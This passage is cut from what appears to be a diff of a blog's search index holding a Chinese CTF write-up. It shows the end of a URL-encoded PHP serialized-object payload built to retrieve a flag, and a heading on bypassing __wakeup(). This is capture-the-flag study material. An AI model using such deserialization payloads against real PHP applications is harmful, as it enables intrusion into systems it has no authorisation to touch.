class="line">min%22%3Bs%3A4%3A%22w44m%22%3Bs%3A9%3A%22%00%2A%00pas</span><br><span class="line">swd%22%3Bs%3A5%3A%2208067%22%3B%7Ds%3A4%3A%22w22m%22%</span><br><span class="line">3Bs%3A7%3A%22Getflag%22%3B%7D%7D</span><br></pre></td></tr></table></figure>
-
-<p><strong>绕过：</strong></p>
-<h4 id="1-wakeup-方法漏洞："><a href="#1-wakeup-方法漏洞：" class="headerlink" title="1.__wakeup()方法漏洞："></a>1.__wakeup()方法漏洞：</h4>]]></content>
-      <tags>
-        <tag>攻防世界</tag>
       </tags>
   </entry>
   <entry>
